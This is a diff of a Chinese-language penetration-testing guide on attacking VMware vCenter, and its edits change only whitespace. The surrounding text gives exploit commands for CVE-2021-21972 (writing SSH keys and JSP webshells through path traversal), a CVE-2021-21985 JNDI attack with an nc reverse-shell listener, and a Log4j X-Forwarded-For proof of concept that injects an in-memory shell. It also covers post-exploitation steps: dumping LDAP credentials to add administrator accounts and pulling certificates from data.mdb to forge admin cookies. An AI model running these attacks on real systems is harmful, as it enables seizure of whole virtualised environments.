@@ -9,7 +9,7 @@ cve: "CVE-2021-21980"
 
 **01 前言**
 
-Vcenter 不用多说，懂的都懂，Vcenter 是构建私有云基础架构的软件，它提供了一个可伸缩、可扩展的平台，为 虚拟化管理奠定了基础。VMware vCenter Server（以前称为 VMware VirtualCenterl），可集中管理 VMware vSphere 环境，与其他管理平台相比，极大地提高了 IT 管理员对虚拟环境的控制。
+Vcenter 不用多说，懂的都懂，Vcenter 是构建私有云基础架构的软件，它提供了一个可伸缩、可扩展的平台，为 虚拟化管理奠定了基础。VMware vCenter Server（以前称为 VMware VirtualCenterl），可集中管理 VMware vSphere 环境，与其他管理平台相比，极大地提高了 IT 管理员对虚拟环境的控制。
 
 一句话概括: Vcenter 是用来控制虚拟环境的，是一个集权系统，那么拿下它，就等同于拿下了它控制的所有虚拟主机。
 
@@ -111,7 +111,7 @@ VMware ESXi 6.5 系列 < ESXi650-202102101-SG
 
 可直接利用攻击脚本进行攻击利用！
 
-需要根据 windows\linux 系统，不断的拼接 url， 攻击脚本至少需要写 120 次，寻找真实的绝对路径，受网络问题影响较大，如果写入成功，就会直接回显 shell 地址。 
+需要根据 windows\linux 系统，不断的拼接 url， 攻击脚本至少需要写 120 次，寻找真实的绝对路径，受网络问题影响较大，如果写入成功，就会直接回显 shell 地址。 
 
 **windows 系统**
 
@@ -162,7 +162,7 @@ python3 CVE-2021-21972.py -t x.x.x.x -p /home/vsphere-ui/.ssh/authorized_keys -o
 
 2、遍历写 shell（时间较久）  
 
-Linux  shell 路径
+Linux  shell 路径
 
 ```
 ../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/41/0/h5ngc.war/resources/log.jsp
@@ -212,7 +212,7 @@ java -jar JNDIInjection-Bypass.jar 1099 <监听port>
 
 # nc 接收反弹 shell
 
-nc -lvvp <监听 port> 
+nc -lvvp <监听 port> 
 
 3、攻击机：  
 python cve-2021-21985_exp.py
@@ -332,10 +332,10 @@ xff header jndi 注入内存马
 
 漏洞成因是 Vcenter 的 SAML 路由中，可以通过增加 XFF 头触发漏洞，把需要执行的命令跟在 XFF 后面。
 
-目录攻击 url: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
+目录攻击 url: /websso/SAML2/SSO/vsphere.local?SAMLRequest=
 
 ```
-poc :
+poc :
 x-forwarded-for:{jndi}
 GET/websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
 Host: 192.168.121.137
@@ -355,7 +355,7 @@ Connection: close
 
 ```
 
-DNSlog 探测漏洞是否存在; 内网 不出网，可以在内网搭建 ldap。  直接注入内存马
+DNSlog 探测漏洞是否存在; 内网 不出网，可以在内网搭建 ldap。  直接注入内存马
 
 **05 后渗透获取 web 权限**
 
@@ -363,7 +363,7 @@ DNSlog 探测漏洞是否存在; 内网 不出网，可以在内网搭建 ldap�
 
 ldap 直接添加 vcenter 管理员账号。需要高权限
 
-**第一步  在目标 vcenter 导出 ldap 凭据信息**
+**第一步  在目标 vcenter 导出 ldap 凭据信息**
 
 linux 列 ldap 信息：
 
@@ -383,7 +383,7 @@ dcAccountDN
 
 **第二步直接上脚本添加账户，再添加到管理员：**
 
-自己修改脚本：改成不 input, 避免密码的编码问题。 但是需要将 ldap 的凭证信息 填写进我们脚本中，然后一步到位。不用输入添加的账号和密码 。都是默认的
+自己修改脚本：改成不 input, 避免密码的编码问题。 但是需要将 ldap 的凭证信息 填写进我们脚本中，然后一步到位。不用输入添加的账号和密码 。都是默认的
 
 有 linux、windows 两个版本。
 
@@ -415,7 +415,7 @@ linux
 
 /storage/db/vmware-vmdir/data.mdb
 
-利用 data.mdb 提取 ldp 证书  进行身份验证获取有效管理员的 cookie
+利用 data.mdb 提取 ldp 证书  进行身份验证获取有效管理员的 cookie
 
 利用脚本进行攻击：
 
